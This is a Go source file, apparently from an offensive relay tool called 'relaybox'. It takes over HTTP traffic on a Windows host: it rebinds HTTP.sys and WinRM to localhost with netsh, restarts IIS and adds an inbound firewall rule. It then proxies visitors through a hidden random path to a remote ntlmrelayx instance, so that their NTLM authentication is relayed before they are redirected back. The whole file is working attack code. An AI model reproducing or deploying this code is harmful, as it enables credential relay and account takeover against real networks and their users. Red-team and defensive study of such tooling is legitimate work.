package httprelay

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"relaybox/pkg/system/cert"
	"relaybox/pkg/system/executil"
	"relaybox/pkg/system/logging"
	"relaybox/pkg/system/random"
	"strings"
)

type HTTP struct {
	Listeners      []net.Listener
	ExePath        string
	LocalAddresses []string
	RemoteAddr     string
	BaseHost       string
	Logger         *logging.Logger
	PfxPath        string
	PfxPass        string
}

func NewHTTP(exePath string, localAddresses []string, remoteAddr, baseHost, pfx, pfxPass string, verbose bool) *HTTP {
	return &HTTP{
		Listeners:      []net.Listener{},
		ExePath:        exePath,
		LocalAddresses: localAddresses,
		RemoteAddr:     remoteAddr,
		BaseHost:       baseHost,
		Logger:         logging.NewLogger("HTTP", verbose),
		PfxPath:        pfx,
		PfxPass:        pfxPass,
	}
}

func (h *HTTP) GetPort() string {
	return ":80"
}

func (h *HTTP) GetServiceName() string {
	return "HTTP"
}

func (h *HTTP) Start() int {
	h.Logger.Log("Binding HTTP services to localhost (includes WinRM)...")
	err := executil.RunCommandPowershell("netsh http add iplisten ipaddress=127.0.0.1")
	if err != nil {
		h.Logger.Log(fmt.Sprintf("Failed to rebind HTTP services to localhost %s", err))
		return 1
	}
	h.Logger.Log("Restarting IIS service")
	err = executil.RunCommandPowershell("iisreset /restart")

	remoteTarget, _ := url.Parse("http://" + h.RemoteAddr + h.GetPort())
	localTarget, _ := url.Parse("http://127.0.0.1")

	proxySlug := "/" + random.HexString(12)

	// Create reverse proxies
	remoteProxy := httputil.NewSingleHostReverseProxy(remoteTarget)
	localProxy := httputil.NewSingleHostReverseProxy(localTarget)

	// When user visits any path, we check if it has been relayed before, if not we redirect to special path and set cookie.
	localProxy.ModifyResponse = func(resp *http.Response) error {
		if len(resp.Request.CookiesNamed("AuthProxy")) == 0 {
			resp.StatusCode = 307
			resp.Header.Set("Set-Cookie", "AuthProxy=1")
			resp.Header.Add("Location", fmt.Sprintf("http://%s%s?b=%s", h.BaseHost, proxySlug, resp.Request.Host))
		}
		return nil
	}

	remoteProxy.ModifyResponse = func(resp *http.Response) error {
		if resp.StatusCode != 404 { // Indicates relay done from ntlmrelayx
			return nil
		}
		v, ok := resp.Request.URL.Query()["b"]
		if ok && len(v) > 0 {
			resp.StatusCode = 307
			resp.Header.Add("Location", fmt.Sprintf("http://%s", v[0]))
		} else {
			resp.StatusCode = 307
			resp.Header.Add("Location", "/")
		}
		return nil
	}

	directorWrapper := func(proxy *httputil.ReverseProxy) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			h.Logger.Log(r.URL.Path)
			proxy.ServeHTTP(w, r)
		}
	}

	var tlsCert *tls.Certificate
	if h.PfxPath != "" && h.PfxPass != "" {
		tlsCert, err = cert.LoadPFX(h.PfxPath, h.PfxPass)
		if err != nil {
			h.Logger.Log(fmt.Sprintf("Could not load provided pfx for HTTPS: %s", err))
		}
	}

	for _, addr := range h.LocalAddresses {
		listener, err := net.Listen("tcp", addr+h.GetPort())
		if err != nil {
			h.Logger.Log(fmt.Sprintf("Failed to listen on %s: %v\n", addr, err))
			continue
		}
		mux := http.NewServeMux()
		mux.HandleFunc(proxySlug, directorWrapper(remoteProxy))
		mux.HandleFunc("/", directorWrapper(localProxy))
		server := &http.Server{Handler: mux}
		go func() {
			if err := server.Serve(listener); err != nil && err != http.ErrServerClosed {
				h.Logger.Log(fmt.Sprintf("HTTP Proxy server serve error: %v", err))
			}
		}()

		h.Listeners = append(h.Listeners, listener)
		h.Logger.Log(fmt.Sprintf("HTTP proxy listening on %s, forwarding to %s", addr, h.RemoteAddr))

		if tlsCert != nil {
			listener, err := net.Listen("tcp", addr+":443")
			if err != nil {
				h.Logger.Log(fmt.Sprintf("Failed to listen on %s: %v\n", addr, err))
				continue
			}
			server := &http.Server{
				Handler: mux,
				TLSConfig: &tls.Config{
					GetCertificate: func(*tls.ClientHelloInfo) (*tls.Certificate, error) {
						return tlsCert, nil
					},
				},
			}
			go func() {
				if err := server.ServeTLS(listener, "", ""); err != nil && err != http.ErrServerClosed {
					h.Logger.Log(fmt.Sprintf("HTTPS Proxy server serve error: %v", err))
				}
			}()

			h.Listeners = append(h.Listeners, listener)
			h.Logger.Log(fmt.Sprintf("HTTPS proxy listening on %s, forwarding to %s", addr, h.RemoteAddr))
		}
	}

	if len(h.Listeners) == 0 {
		h.Logger.Log("No listeners created, exiting...")
		return 1
	}

	h.createHTTPFirewallRule()

	return 0
}

func (h *HTTP) Stop() {
	for _, listener := range h.Listeners {
		if err := listener.Close(); err != nil {
			h.Logger.Log(fmt.Sprintf("Error closing listener: %v", err))
		}
	}
	h.Logger.Log("Removing HTTP binding to localhost")
	err := executil.RunCommandPowershell("netsh http delete iplisten ipaddress=127.0.0.1")
	if err != nil {
		h.Logger.Log(fmt.Sprintf("Failed to rebind HTTP services to all interfaces %s", err))
	}
	h.Logger.Log("Restarting IIS service")
	err = executil.RunCommandPowershell("iisreset /restart")
	if err != nil {
		h.Logger.Log(fmt.Sprintf("Failed to restart IIS service. %s", err))
	}
	h.removeHTTPFirewallRule()
	h.Logger.Log("HTTP service stopped")
}

func (h *HTTP) createHTTPFirewallRule() {
	log.Println("Creating HTTP firewall rule...")
	localAddressesStr := ""
	for _, addr := range h.LocalAddresses {
		localAddressesStr += fmt.Sprintf(`"%s",`, addr)
	}
	localAddressesStr = strings.TrimSuffix(localAddressesStr, ",")
	ruleCmd := fmt.Sprintf(
		`New-NetFirewallRule -DisplayName "HTTP 80" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 80 -LocalAddress @(%s) -Program "%s"`,
		localAddressesStr,
		h.ExePath,
	)
	executil.RunCommandPowershell(ruleCmd)
	log.Println("HTTP firewall rule created.")
}

func (h *HTTP) removeHTTPFirewallRule() {
	log.Println("Removing HTTP firewall rule...")
	executil.RunCommandPowershell(`Remove-NetFirewallRule -DisplayName "HTTP 80"`)
	log.Println("HTTP firewall rule removed.")
}
